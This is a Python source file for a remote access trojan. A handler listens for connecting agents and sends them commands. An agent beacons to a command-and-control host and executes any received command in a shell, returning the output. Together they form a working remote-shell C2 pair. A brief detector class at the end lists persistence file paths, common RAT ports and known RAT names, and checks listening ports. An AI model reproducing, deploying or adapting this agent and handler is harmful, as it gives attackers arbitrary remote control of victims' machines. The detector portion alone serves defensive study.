"""RAT Core - Agent and Handler"""
import socket, threading, json, os, time, hashlib, base64
from datetime import datetime

class RATHandler:
    def __init__(self, host="0.0.0.0", port=4444):
        self.host = host
        self.port = port
        self.agents = {}
        self.running = False
    
    def start(self):
        self.running = True
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        print(f"[*] Handler listening on {self.host}:{self.port}")
        while self.running:
            try:
                self.server.settimeout(1)
                conn, addr = self.server.accept()
                agent_id = hashlib.md5(f"{addr}{time.time()}".encode()).hexdigest()[:8]
                self.agents[agent_id] = {"conn": conn, "addr": addr, "connected": datetime.now().isoformat()}
                print(f"[+] Agent {agent_id} connected from {addr}")
            except socket.timeout: pass
    
    def send_command(self, agent_id, command):
        agent = self.agents.get(agent_id)
        if not agent: return None
        try:
            agent["conn"].send(command.encode())
            response = agent["conn"].recv(65535).decode(errors="ignore")
            return response
        except: return None
    
    def list_agents(self):
        return {aid: {"addr": str(a["addr"]), "connected": a["connected"]} for aid, a in self.agents.items()}

class RATAgent:
    def __init__(self, c2_host, c2_port, beacon_interval=30):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.beacon_interval = beacon_interval
        self.running = False
    
    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.c2_host, self.c2_port))
        self.running = True
        self._beacon_loop()
    
    def _beacon_loop(self):
        while self.running:
            try:
                cmd = self.sock.recv(4096).decode()
                if cmd: result = self._execute(cmd); self.sock.send(result.encode())
            except: break
    
    def _execute(self, command):
        import subprocess
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=30)
            return result.decode(errors="ignore")
        except: return "[!] Command failed"

class RATDetector:
    INDICATORS = {
        "persistence": ["/etc/crontab", "/etc/rc.local", "~/.bashrc", "~/.profile",
                       "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"],
        "suspicious_ports": [4444, 5555, 6666, 7777, 8888, 9999, 1337, 31337],
        "known_rats": ["darkcomet", "njrat", "netbus", "subseven", "poison ivy", "gh0st"],
    }
    
    def scan_connections(self):
        import subprocess
        findings = []
        try:
            result = subprocess.check_output(["ss", "-tlnp"], text=True)
            for port in self.INDICATORS["suspicious_ports"]:
                if f":{port}" in result:
                    findings.append({"port": port, "severity": "HIGH", "description": f"Suspicious port {port} listening"})
        except: pass
        return findings
